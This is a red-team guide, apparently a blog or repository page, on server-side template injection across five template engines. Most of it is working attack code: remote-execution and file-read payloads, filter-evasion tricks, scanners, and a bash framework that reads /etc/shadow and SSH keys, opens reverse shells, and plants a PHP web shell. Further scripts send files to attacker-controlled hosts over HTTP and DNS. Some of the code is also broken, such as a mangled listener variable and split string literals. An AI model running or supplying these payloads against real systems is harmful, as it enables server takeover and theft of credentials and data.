# 🔥 Elite SSTI (Server-Side Template Injection) Attack Methodology
## Advanced Red Team Techniques & Elite Payloads

### 📋 Table of Contents
1. [SSTI Detection & Fingerprinting](#detection)
2. [Template Engine Identification](#identification)
3. [Elite Payload Arsenal](#payloads)
4. [Advanced Bypass Techniques](#bypasses)
5. [Automation Scripts](#automation)
6. [Real-World Exploitation](#exploitation)
7. [Post-Exploitation](#post-exploitation)

---

## 🎯 Phase 1: SSTI Detection & Fingerprinting {#detection}

### Basic Detection Payloads
```bash
# Mathematical expressions - Universal detection
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
${{7*7}}
@(7*7)

# String concatenation tests
{{"a"+"b"}}
${"a"+"b"}
<%= "a"+"b" %>
#{concat("a","b")}

# Advanced polyglot detection payload
${{<%[%'"}}%\.
```

### Elite Detection Script
```bash
#!/bin/bash
# ssti_detector.sh - Elite SSTI Detection

TARGET_URL=$1
if [ -z "$TARGET_URL" ]; then
    echo "Usage: ./ssti_detector.sh 'http://target.com/page?param=FUZZ'"
    exit 1
fi

# Create detection payloads
cat > ssti_detection.txt << 'EOF'
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
${{7*7}}
@(7*7)
{7*7}
{{7*'7'}}
${7*'7'}
<%= 7*'7' %>
{{config}}
${java.lang.System.getProperty("java.version")}
<%= system("id") %>
#{T(java.lang.System).getProperty('user.name')}
{{''.__class__.__mro__[2].__subclasses__()}}
${T(java.lang.Runtime).getRuntime().exec('id')}
EOF

echo "🔍 Testing SSTI detection payloads..."
while IFS= read -r payload; do
    encoded_payload=$(echo "$payload" | jq -sRr @uri)
    test_url=$(echo "$TARGET_URL" | sed "s/FUZZ/$encoded_payload/g")
    
    response=$(curl -s "$test_url" -H "User-Agent: Mozilla/5.0" -H "Accept: text/html,application/xhtml+xml")
    
    # Check for mathematical results
    if echo "$response" | grep -q "49"; then
        echo "🎯 POTENTIAL SSTI FOUND: $payload"
        echo "URL: $test_url"
        echo "Response contains: 49 (7*7 result)"
        echo "---"
    fi
    
    # Check for error messages indicating template engines
    if echo "$response" | grep -qi "jinja\|twig\|smarty\|velocity\|freemarker\|thymeleaf"; then
        echo "🔥 TEMPLATE ENGINE DETECTED in response"
        echo "Payload: $payload"
        echo "URL: $test_url"
        echo "---"
    fi
    
    sleep 0.5
done < ssti_detection.txt
```

---

## 🔍 Phase 2: Template Engine Identification {#identification}

### Engine-Specific Fingerprinting
```bash
# Jinja2/Flask Detection
{{config.items()}}
{{self.__dict__}}
{{lipsum.__globals__}}
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Twig/Symfony Detection
{{_self.env.getRuntime("Symfony\Bridge\Twig\Extension\HttpKernelRuntime").controller.container.get("kernel")}}
{{dump(app)}}
{{_self.env.enableDebug()}}

# Smarty Detection
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",true)}

# Velocity Detection
#set($str=$class.forName('java.lang.String'))
#set($chr=$class.forName('java.lang.Character'))
#set($ex=$class.forName('java.lang.Runtime').getRuntime().exec('id'))

# FreeMarker Detection
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

# Thymeleaf Detection
${T(java.lang.Runtime).getRuntime().exec('id')}
${#strings.toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

### Advanced Engine Detection Script
```python
#!/usr/bin/env python3
# ssti_engine_detector.py - Elite Template Engine Detection

import requests
import urllib.parse
import time
import json

class SSTIEngineDetector:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        
    def test_payload(self, payload, expected_responses=None):
        """Test a single payload and check for expected responses"""
        try:
            encoded_payload = urllib.parse.quote(payload)
            test_url = self.target_url.replace('FUZZ', encoded_payload)
            
            response = self.session.get(test_url, timeout=10)
            
            if expected_responses:
                for expected in expected_responses:
                    if expected.lower() in response.text.lower():
                        return True, response.text
            
            return False, response.text
            
        except Exception as e:
            return False, str(e)
    
    def detect_jinja2(self):
        """Detect Jinja2 template engine"""
        payloads = [
            ("{{7*7}}", ["49"]),
            ("{{config}}", ["<Config"]),
            ("{{''.__class__.__mro__[2]}}", ["<class 'object'>"]),
            ("{{lipsum.__globals__}}", ["__builtins__"])
        ]
        
        for payload, expected in payloads:
            found, response = self.test_payload(payload, expected)
            if found:
                return "Jinja2", payload, response[:200]
        return None
    
    def detect_twig(self):
        """Detect Twig template engine"""
        payloads = [
            ("{{7*7}}", ["49"]),
            ("{{dump(app)}}", ["app"]),
            ("{{_self}}", ["__TwigTemplate_"])
        ]
        
        for payload, expected in payloads:
            found, response = self.test_payload(payload, expected)
            if found:
                return "Twig", payload, response[:200]
        return None
    
    def detect_smarty(self):
        """Detect Smarty template engine"""
        payloads = [
            ("{7*7}", ["49"]),
            ("{$smarty.version}", ["Smarty"]),
            ("{php}echo 'smarty';{/php}", ["smarty"])
        ]
        
        for payload, expected in payloads:
            found, response = self.test_payload(payload, expected)
            if found:
                return "Smarty", payload, response[:200]
        return None
    
    def detect_all(self):
        """Run all detection methods"""
        engines = [
            self.detect_jinja2(),
            self.detect_twig(),
            self.detect_smarty()
        ]
        
        detected = [engine for engine in engines if engine]
        return detected

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 ssti_engine_detector.py 'http://target.com/page?param=FUZZ'")
        sys.exit(1)
    
    detector = SSTIEngineDetector(sys.argv[1])
    results = detector.detect_all()
    
    if results:
        print("🎯 Template Engines Detected:")
        for engine, payload, response in results:
            print(f"Engine: {engine}")
            print(f"Payload: {payload}")
            print(f"Response: {response}")
            print("-" * 50)
    else:
        print("❌ No template engines detected")
```

---

## 💥 Phase 3: Elite Payload Arsenal {#payloads}

### Jinja2/Flask Elite Payloads
```python
# Basic RCE
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}

# Advanced RCE with subprocess
{{lipsum.__globals__.get('__builtins__').get('__import__')('subprocess').check_output('id',shell=True)}}

# File read
{{lipsum.__globals__['__builtins__']['open']('/etc/passwd').read()}}

# Config extraction
{{config.items()}}
{{self.__dict__}}

# Class exploration
{{''.__class__.__mro__[2].__subclasses__()}}

# Advanced payload with error handling
{% set os = lipsum.__globals__.os %}{{os.popen('id 2>&1').read()}}

# Blind RCE with time delay
{{lipsum.__globals__.os.popen('sleep 5').read()}}

# DNS exfiltration
{{lipsum.__globals__.os.popen('nslookup $(whoami).attacker.com').read()}}

# Reverse shell
{{lipsum.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"').read()}}
```

### Twig Elite Payloads
```php
# Basic RCE
{{_self.env.getRuntime("Symfony\Bridge\Twig\Extension\HttpKernelRuntime").controller.container.get("kernel")}}

# File system access
{{_self.env.getLoader().getSourceContext('../../../../etc/passwd').getCode()}}

# Advanced RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# PHP function execution
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# File inclusion
{{include('../../../../etc/passwd')}}

# Environment variable access
{{dump(_context)}}
{{dump(app.request.server.all)}}
```

### Smarty Elite Payloads
```php
# Direct PHP execution
{php}system('id');{/php}
{php}passthru($_GET['cmd']);{/php}

# File write for webshell
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",true)}

# File read
{php}echo file_get_contents('/etc/passwd');{/php}

# Advanced RCE
{php}$cmd=$_GET['cmd'];echo `$cmd`;{/php}
```

### Velocity Elite Payloads
```java
# Basic RCE
#set($str=$class.forName('java.lang.String'))
#set($chr=$class.forName('java.lang.Character'))
#set($ex=$class.forName('java.lang.Runtime').getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end

# File read
#set($input=$class.forName('java.io.FileInputStream').getConstructor($class.forName('java.lang.String')).newInstance('/etc/passwd'))
#set($sc=$class.forName('java.util.Scanner').getConstructor($class.forName('java.io.InputStream')).newInstance($input).useDelimiter('\A'))
#if($sc.hasNext())$sc.next()#end

# Advanced payload
#set($runtime=$class.forName('java.lang.Runtime').getRuntime())
#set($process=$runtime.exec('id'))
#set($input=$process.getInputStream())
#set($sc=$class.forName('java.util.Scanner').getConstructor($class.forName('java.io.InputStream')).newInstance($input).useDelimiter('\A'))
#if($sc.hasNext())$sc.next()#end
```

### FreeMarker Elite Payloads
```java
# Basic RCE
${"freemarker.template.utility.Execute"?new()("id")}

# Advanced RCE with output
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# File read
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(",")}

# ObjectWrapper exploitation
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

## 🛡️ Phase 4: Advanced Bypass Techniques {#bypasses}

### WAF Evasion Techniques
```bash
# Encoding bypasses
{{7*7}}                    # Original
{{7*7|e}}                  # HTML entity encoding
{{7*7|urlencode}}          # URL encoding
{{7*7|base64encode}}       # Base64 encoding

# String concatenation
{{"sy"+"stem"}}
{{["sy","stem"]|join}}
{{dict(sy="stem").sy}}

# Unicode bypasses
{{７*７}}                   # Full-width characters
{{7＊7}}                    # Full-width asterisk
{{7\u002A7}}               # Unicode escape

# Comment injection
{{7/*comment*/*7}}
{{7<!-- comment -->*7}}

# Variable assignment
{% set x = 7 %}{{x*x}}
{% set cmd = "id" %}{{lipsum.__globals__.os.popen(cmd).read()}}

# Filter bypasses
{{7*7|safe}}
{{7*7|raw}}
{{7*7|escape}}

# Attribute access bypasses
{{lipsum.__globals__}}     # Direct access
{{lipsum["__globals__"]}}  # Dictionary access
{{lipsum|attr("__globals__")}}  # Attribute filter
```

### Advanced Obfuscation
```python
# Python payload obfuscation for Jinja2
# Original: os.popen('id').read()

# Method 1: String building
{{lipsum.__globals__[chr(111)+chr(115)].popen(chr(105)+chr(100)).read()}}

# Method 2: Base64 decode
{{lipsum.__globals__.get('__builtins__').get('__import__')('base64').b64decode('aWQ=').decode().strip()}}

# Method 3: Reverse and reverse back
{{lipsum.__globals__.os.popen('di'[::-1]).read()}}

# Method 4: Using format strings
{{"{0}{1}".format("i","d")}}
{{lipsum.__globals__.os.popen("{0}{1}".format("i","d")).read()}}
```

### Context-Aware Bypasses
```bash
# HTML context
<img src="{{payload}}" onerror="alert(1)">

# JavaScript context
var data = "{{payload|escapejs}}";

# CSS context
body { background: url("{{payload}}"); }

# Attribute context
<div class="{{payload}}">

# URL context
<a href="{{payload|urlencode}}">
```

---

## 🤖 Phase 5: Automation Scripts {#automation}

### Elite SSTI Scanner
```python
#!/usr/bin/env python3
# elite_ssti_scanner.py - Advanced SSTI Detection & Exploitation

import requests
import urllib.parse
import threading
import time
import json
import base64
from concurrent.futures import ThreadPoolExecutor

class EliteSSTIScanner:
    def __init__(self, target_url, threads=10):
        self.target_url = target_url
        self.threads = threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
        
    def load_payloads(self):
        """Load comprehensive payload database"""
        return {
            'detection': [
                '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}',
                '{7*7}', '@(7*7)', '${{7*7}}', '{{7*'7'}}',
                '${7*'7'}', '<%= 7*'7' %>'
            ],
            'jinja2_rce': [
                '{{lipsum.__globals__.os.popen('id').read()}}',
                '{{cycler.__init__.__globals__.os.popen('id').read()}}',
                '{{joiner.__init__.__globals__.os.popen('id').read()}}',
                '{{lipsum.__globals__['__builtins__']['__import__']('subprocess').check_output('id',shell=True)}}'
            ],
            'twig_rce': [
                '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
                '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}'
            ],
            'smarty_rce': [
                '{php}system('id');{/php}',
                '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",true)}'
            ]
        }
    
    def test_payload(self, payload, payload_type):
        """Test individual payload"""
        try:
            encoded_payload = urllib.parse.quote(payload)
            test_url = self.target_url.replace('FUZZ', encoded_payload)
            
            response = self.session.get(test_url, timeout=10)
            
            # Detection logic based on payload type
            if payload_type == 'detection':
                if '49' in response.text:
                    return True, f"Mathematical expression evaluated: {payload}"
            
            elif payload_type in ['jinja2_rce', 'twig_rce', 'smarty_rce']:
                # Look for command output indicators
                indicators = ['uid=', 'gid=', 'groups=', 'root', 'www-data']
                if any(indicator in response.text.lower() for indicator in indicators):
                    return True, f"RCE confirmed: {payload}"
            
            return False, None
            
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def scan_with_payloads(self, payloads, payload_type):
        """Scan with specific payload set"""
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for payload in payloads:
                future = executor.submit(self.test_payload, payload, payload_type)
                futures.append((future, payload))
            
            for future, payload in futures:
                try:
                    success, result = future.result(timeout=15)
                    if success:
                        self.vulnerabilities.append({
                            'type': payload_type,
                            'payload': payload,
                            'result': result,
                            'url': self.target_url.replace('FUZZ', urllib.parse.quote(payload))
                        })
                        print(f"🎯 VULNERABILITY FOUND: {result}")
                except Exception as e:
                    print(f"❌ Error testing {payload}: {str(e)}")
    
    def run_scan(self):
        """Execute complete SSTI scan"""
        print(f"🚀 Starting Elite SSTI Scan on: {self.target_url}")
        payloads = self.load_payloads()
        
        # Phase 1: Detection
        print("🔍 Phase 1: SSTI Detection")
        self.scan_with_payloads(payloads['detection'], 'detection')
        
        if self.vulnerabilities:
            print("✅ SSTI detected! Proceeding with exploitation...")
            
            # Phase 2: RCE Testing
            print("💥 Phase 2: RCE Exploitation")
            for engine in ['jinja2_rce', 'twig_rce', 'smarty_rce']:
                print(f"Testing {engine}...")
                self.scan_with_payloads(payloads[engine], engine)
        
        return self.vulnerabilities
    
    def generate_report(self):
        """Generate detailed vulnerability report"""
        if not self.vulnerabilities:
            return "No vulnerabilities found."
        
        report = "# SSTI Vulnerability Report

"
        report += f"**Target:** {self.target_url}
"
        report += f"**Scan Date:** {time.strftime('%Y-%m-%d %H:%M:%S')}

"
        
        for vuln in self.vulnerabilities:
            report += f"## {vuln['type'].upper()} Vulnerability
"
            report += f"**Payload:** `{vuln['payload']}`
"
            report += f"**Result:** {vuln['result']}
"
            report += f"**URL:** {vuln['url']}

"
        
        return report

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 elite_ssti_scanner.py 'http://target.com/page?param=FUZZ'")
        sys.exit(1)
    
    scanner = EliteSSTIScanner(sys.argv[1])
    vulnerabilities = scanner.run_scan()
    
    print("
" + "="*50)
    print("📊 SCAN RESULTS")
    print("="*50)
    
    if vulnerabilities:
        print(f"🎯 Found {len(vulnerabilities)} vulnerabilities!")
        report = scanner.generate_report()
        
        # Save report
        with open('ssti_report.md', 'w') as f:
            f.write(report)
        print("📄 Report saved to: ssti_report.md")
    else:
        print("❌ No vulnerabilities detected")
```

### Blind SSTI Detection
```python
#!/usr/bin/env python3
# blind_ssti_detector.py - Detect SSTI through timing and DNS

import requests
import time
import dns.resolver
import threading
from urllib.parse import quote

class BlindSSTIDetector:
    def __init__(self, target_url, collaborator_domain):
        self.target_url = target_url
        self.collaborator_domain = collaborator_domain
        self.session = requests.Session()
        
    def time_based_detection(self):
        """Detect SSTI using time delays"""
        payloads = [
            # Jinja2 time delay
            "{{lipsum.__globals__.os.popen('sleep 5').read()}}",
            # Twig time delay  
            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('sleep 5')}}",
            # Smarty time delay
            "{php}sleep(5);{/php}",
            # Velocity time delay
            "#set($ex=$class.forName('java.lang.Runtime').getRuntime().exec('sleep 5'))"
        ]
        
        for payload in payloads:
            print(f"Testing time-based payload: {payload[:50]}...")
            start_time = time.time()
            
            try:
                encoded_payload = quote(payload)
                test_url = self.target_url.replace('FUZZ', encoded_payload)
                response = self.session.get(test_url, timeout=10)
                
                elapsed_time = time.time() - start_time
                
                if elapsed_time >= 4.5:  # Allow some margin
                    print(f"🎯 TIME-BASED SSTI DETECTED!")
                    print(f"Payload: {payload}")
                    print(f"Response time: {elapsed_time:.2f} seconds")
                    return True
                    
            except requests.exceptions.Timeout:
                print(f"🎯 TIMEOUT-BASED SSTI DETECTED!")
                print(f"Payload: {payload}")
                return True
            except Exception as e:
                print(f"Error: {str(e)}")
        
        return False
    
    def dns_based_detection(self):
        """Detect SSTI using DNS exfiltration"""
        unique_id = str(int(time.time()))
        dns_domain = f"{unique_id}.{self.collaborator_domain}"
        
        payloads = [
            # Jinja2 DNS exfiltration
            f"{{{{lipsum.__globals__.os.popen('nslookup {dns_domain}').read()}}}}",
            # Twig DNS exfiltration
            f"{{{{_self.env.registerUndefinedFilterCallback('system')}}}}{{{{_self.env.getFilter('nslookup {dns_domain}')}}}}",
            # Smarty DNS exfiltration
            f"{{php}}system('nslookup {dns_domain}');{{/php}}"
        ]
        
        for payload in payloads:
            print(f"Testing DNS-based payload: {payload[:50]}...")
            
            try:
                encoded_payload = quote(payload)
                test_url = self.target_url.replace('FUZZ', encoded_payload)
                
                # Send request
                self.session.get(test_url, timeout=5)
                
                # Wait a bit for DNS resolution
                time.sleep(2)
                
                # Check if DNS query was made
                if self.check_dns_query(dns_domain):
                    print(f"🎯 DNS-BASED SSTI DETECTED!")
                    print(f"Payload: {payload}")
                    print(f"DNS query detected for: {dns_domain}")
                    return True
                    
            except Exception as e:
                print(f"Error: {str(e)}")
        
        return False
    
    def check_dns_query(self, domain):
        """Check if DNS query was made (simplified)"""
        try:
            # This would typically check your DNS logs
            # For demo purposes, we'll just try to resolve
            dns.resolver.resolve(domain, 'A')
            return True
        except:
            return False

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print("Usage: python3 blind_ssti_detector.py 'http://target.com/page?param=FUZZ' 'collaborator.com'")
        sys.exit(1)
    
    detector = BlindSSTIDetector(sys.argv[1], sys.argv[2])
    
    print("🕵️ Starting Blind SSTI Detection...")
    
    time_based = detector.time_based_detection()
    dns_based = detector.dns_based_detection()
    
    if time_based or dns_based:
        print("✅ Blind SSTI vulnerability confirmed!")
    else:
        print("❌ No blind SSTI detected")
```

---

## 🎯 Phase 6: Real-World Exploitation {#exploitation}

### Multi-Stage Exploitation Framework
```bash
#!/bin/bash
# ssti_exploit_framework.sh - Complete SSTI Exploitation

TARGET_URL=$1
LHOST=$2
LPORT=$3

if [ -z "$TARGET_URL" ] || [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
    echo "Usage: ./ssti_exploit_framework.sh 'http://target.com/page?param=FUZZ' LHOST LPORT"
    exit 1
fi

echo "🔥 Elite SSTI Exploitation Framework"
echo "Target: $TARGET_URL"
echo "Listener: $LHOST:$LPORT"

# Phase 1: Information Gathering
echo "📊 Phase 1: Information Gathering"

# Test for Jinja2 config exposure
jinja_config_payload="{{config.items()}}"
encoded_payload=$(echo "$jinja_config_payload" | jq -sRr @uri)
test_url=$(echo "$TARGET_URL" | sed "s/FUZZ/$encoded_payload/g")

echo "Testing config exposure..."
config_response=$(curl -s "$test_url")

if echo "$config_response" | grep -q "SECRET_KEY"; then
    echo "🎯 Flask SECRET_KEY exposed!"
    echo "$config_response" | grep -o "SECRET_KEY[^,]*" > secret_key.txt
fi

# Phase 2: File System Access
echo "📁 Phase 2: File System Access"

# Read sensitive files
sensitive_files=("/etc/passwd" "/etc/shadow" "/proc/version" "/etc/hosts" "~/.bash_history")

for file in "${sensitive_files[@]}"; do
    echo "Attempting to read: $file"
    
    # Jinja2 file read payload
    file_payload="{{lipsum.__globals__['__builtins__']['open']('$file').read()}}"
    encoded_payload=$(echo "$file_payload" | jq -sRr @uri)
    test_url=$(echo "$TARGET_URL" | sed "s/FUZZ/$encoded_payload/g")
    
    response=$(curl -s "$test_url")
    
    if echo "$response" | grep -q "root:\|version\|localhost"; then
        echo "✅ Successfully read $file"
        echo "$response" > "extracted_$(basename $file).txt"
    fi
done

# Phase 3: Command Execution
echo "💥 Phase 3: Command Execution"

# Test basic command execution
commands=("id" "whoami" "uname -a" "ps aux" "netstat -tulpn")

for cmd in "${commands[@]}"; do
    echo "Executing: $cmd"
    
    # Jinja2 RCE payload
    rce_payload="{{lipsum.__globals__.os.popen('$cmd').read()}}"
    encoded_payload=$(echo "$rce_payload" | jq -sRr @uri)
    test_url=$(echo "$TARGET_URL" | sed "s/FUZZ/$encoded_payload/g")
    
    response=$(curl -s "$test_url")
    
    if [ ! -z "$response" ] && [ "$response" != "null" ]; then
        echo "✅ Command executed successfully"
        echo "$response" > "command_output_$(echo $cmd | tr ' ' '_').txt"
    fi
done

# Phase 4: Reverse Shell
echo "🐚 Phase 4: Reverse Shell Establishment"

# Start listener in background
echo "Starting listener on $LHOST:$LPORT..."
nc -lvnp $L PORT &
LISTENER_PID=$!

sleep 2

# Reverse shell payloads
reverse_shells=(
    "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
    "nc -e /bin/bash $LHOST $LPORT"
)

for shell_cmd in "${reverse_shells[@]}"; do
    echo "Attempting reverse shell: ${shell_cmd:0:50}..."
    
    # Jinja2 reverse shell payload
    shell_payload="{{lipsum.__globals__.os.popen('$shell_cmd').read()}}"
    encoded_payload=$(echo "$shell_payload" | jq -sRr @uri)
    test_url=$(echo "$TARGET_URL" | sed "s/FUZZ/$encoded_payload/g")
    
    # Execute payload
    curl -s "$test_url" &
    
    # Wait for connection
    sleep 5
    
    # Check if listener received connection
    if ps -p $LISTENER_PID > /dev/null; then
        echo "🎯 Reverse shell established!"
        break
    fi
done

# Phase 5: Persistence
echo "🔒 Phase 5: Establishing Persistence"

# Web shell payload
webshell_content='<?php if(isset($_GET["cmd"])){echo shell_exec($_GET["cmd"]);} ?>'
webshell_payload="{{lipsum.__globals__['__builtins__']['open']('shell.php','w').write('$webshell_content')}}"

encoded_payload=$(echo "$webshell_payload" | jq -sRr @uri)
test_url=$(echo "$TARGET_URL" | sed "s/FUZZ/$encoded_payload/g")

echo "Deploying web shell..."
curl -s "$test_url"

# Test web shell
webshell_test=$(curl -s "$(dirname $TARGET_URL)/shell.php?cmd=id")
if echo "$webshell_test" | grep -q "uid="; then
    echo "✅ Web shell deployed successfully!"
    echo "Access: $(dirname $TARGET_URL)/shell.php?cmd=COMMAND"
fi

echo "🏁 Exploitation completed!"
echo "Check generated files for extracted data."
```

### Advanced Payload Generator
```python
#!/usr/bin/env python3
# ssti_payload_generator.py - Dynamic Payload Generation

import base64
import urllib.parse
import random
import string

class SSTIPayloadGenerator:
    def __init__(self):
        self.engines = ['jinja2', 'twig', 'smarty', 'velocity', 'freemarker']
        
    def generate_obfuscated_command(self, command):
        """Generate obfuscated command variations"""
        variations = []
        
        # Base64 encoding
        b64_cmd = base64.b64encode(command.encode()).decode()
        variations.append(f"echo {b64_cmd} | base64 -d | bash")
        
        # Character encoding
        char_encoded = ''.join([f"\x{ord(c):02x}" for c in command])
        variations.append(f"echo -e '{char_encoded}' | bash")
        
        # Reverse and reverse back
        reversed_cmd = command[::-1]
        variations.append(f"echo '{reversed_cmd}' | rev | bash")
        
        # Hex encoding
        hex_cmd = command.encode().hex()
        variations.append(f"echo '{hex_cmd}' | xxd -r -p | bash")
        
        return variations
    
    def generate_jinja2_payloads(self, command):
        """Generate Jinja2 SSTI payloads"""
        obfuscated_commands = self.generate_obfuscated_command(command)
        payloads = []
        
        # Basic payloads
        basic_templates = [
            "{{lipsum.__globals__.os.popen('{}').read()}}",
            "{{cycler.__init__.__globals__.os.popen('{}').read()}}",
            "{{joiner.__init__.__globals__.os.popen('{}').read()}}"
        ]
        
        for template in basic_templates:
            payloads.append(template.format(command))
            for obf_cmd in obfuscated_commands:
                payloads.append(template.format(obf_cmd))
        
        # Advanced payloads with subprocess
        subprocess_template = "{{lipsum.__globals__.get('__builtins__').get('__import__')('subprocess').check_output('{}',shell=True)}}"
        payloads.append(subprocess_template.format(command))
        
        # Blind payloads
        blind_templates = [
            "{{lipsum.__globals__.os.popen('{} && sleep 5').read()}}",
            "{{lipsum.__globals__.os.popen('{} | curl -d @- http://attacker.com').read()}}"
        ]
        
        for template in blind_templates:
            payloads.append(template.format(command))
        
        return payloads
    
    def generate_twig_payloads(self, command):
        """Generate Twig SSTI payloads"""
        payloads = [
            f"{{{{_self.env.registerUndefinedFilterCallback('system')}}}}{{{{_self.env.getFilter('{command}')}}}}",
            f"{{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('{command}')}}}}",
            f"{{{{_self.env.registerUndefinedFilterCallback('passthru')}}}}{{{{_self.env.getFilter('{command}')}}}}"
        ]
        
        return payloads
    
    def generate_smarty_payloads(self, command):
        """Generate Smarty SSTI payloads"""
        payloads = [
            f"{{php}}system('{command}');{{/php}}",
            f"{{php}}exec('{command}');{{/php}}",
            f"{{php}}passthru('{command}');{{/php}}",
            f"{{php}}shell_exec('{command}');{{/php}}"
        ]
        
        # File write payloads
        webshell_content = f"<?php system($_GET['cmd']); ?>"
        payloads.append(f"{{Smarty_Internal_Write_File::writeFile('shell.php','{webshell_content}',true)}}")
        
        return payloads
    
    def generate_all_payloads(self, command):
        """Generate payloads for all template engines"""
        all_payloads = {}
        
        all_payloads['jinja2'] = self.generate_jinja2_payloads(command)
        all_payloads['twig'] = self.generate_twig_payloads(command)
        all_payloads['smarty'] = self.generate_smarty_payloads(command)
        
        return all_payloads
    
    def generate_polyglot_payloads(self, command):
        """Generate polyglot payloads that work across multiple engines"""
        polyglots = [
            f"${{7*7}}{{{{7*7}}}}<%=7*7%>#{{7*7}}",  # Detection polyglot
            f"${{system('{command}')}}{{{{lipsum.__globals__.os.popen('{command}').read()}}}}",  # Execution polyglot
        ]
        
        return polyglots

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 ssti_payload_generator.py 'command'")
        sys.exit(1)
    
    generator = SSTIPayloadGenerator()
    command = sys.argv[1]
    
    print(f"🔥 Generating SSTI payloads for command: {command}")
    print("="*60)
    
    all_payloads = generator.generate_all_payloads(command)
    
    for engine, payloads in all_payloads.items():
        print(f"
🎯 {engine.upper()} Payloads:")
        print("-" * 30)
        for i, payload in enumerate(payloads, 1):
            print(f"{i:2d}. {payload}")
    
    print(f"
🌐 Polyglot Payloads:")
    print("-" * 30)
    polyglots = generator.generate_polyglot_payloads(command)
    for i, payload in enumerate(polyglots, 1):
        print(f"{i:2d}. {payload}")
    
    # Save to file
    with open('generated_ssti_payloads.txt', 'w') as f:
        f.write(f"SSTI Payloads for command: {command}
")
        f.write("="*60 + "

")
        
        for engine, payloads in all_payloads.items():
            f.write(f"{engine.upper()} Payloads:
")
            f.write("-" * 30 + "
")
            for payload in payloads:
                f.write(f"{payload}
")
            f.write("
")
    
    print(f"
📄 Payloads saved to: generated_ssti_payloads.txt")
```

---

## 🔒 Phase 7: Post-Exploitation {#post-exploitation}

### Data Exfiltration Techniques
```python
#!/usr/bin/env python3
# ssti_data_exfiltration.py - Advanced Data Exfiltration via SSTI

import requests
import base64
import time
import os

class SSTIDataExfiltrator:
    def __init__(self, target_url, exfil_server):
        self.target_url = target_url
        self.exfil_server = exfil_server
        self.session = requests.Session()
        
    def exfiltrate_via_http(self, file_path):
        """Exfiltrate data via HTTP requests"""
        # Jinja2 payload for HTTP exfiltration
        payload = f"""{{{{
            lipsum.__globals__.os.popen('curl -X POST -d @{file_path} {self.exfil_server}/data').read()
        }}}}"""
        
        encoded_payload = requests.utils.quote(payload)
        test_url = self.target_url.replace('FUZZ', encoded_payload)
        
        try:
            response = self.session.get(test_url, timeout=10)
            return True
        except:
            return False
    
    def exfiltrate_via_dns(self, file_path, dns_server):
        """Exfiltrate data via DNS queries"""
        # Base64 encode file content and send via DNS
        payload = f"""{{{{
            lipsum.__globals__.os.popen('cat {file_path} | base64 | while read line; do nslookup $line.{dns_server}; done').read()
        }}}}"""
        
        encoded_payload = requests.utils.quote(payload)
        test_url = self.target_url.replace('FUZZ', encoded_payload)
        
        try:
            response = self.session.get(test_url, timeout=10)
            return True
        except:
            return False
    
    def exfiltrate_sensitive_files(self):
        """Exfiltrate common sensitive files"""
        sensitive_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/proc/version',
            '/proc/cpuinfo',
            '/proc/meminfo',
            '~/.bash_history',
            '~/.ssh/id_rsa',
            '~/.ssh/known_hosts',
            '/var/log/auth.log',
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log'
        ]
        
        for file_path in sensitive_files:
            print(f"Attempting to exfiltrate: {file_path}")
            
            if self.exfiltrate_via_http(file_path):
                print(f"✅ Successfully exfiltrated: {file_path}")
            else:
                print(f"❌ Failed to exfiltrate: {file_path}")
            
            time.sleep(1)  # Rate limiting

if __name__ == "__main__":
    import sys
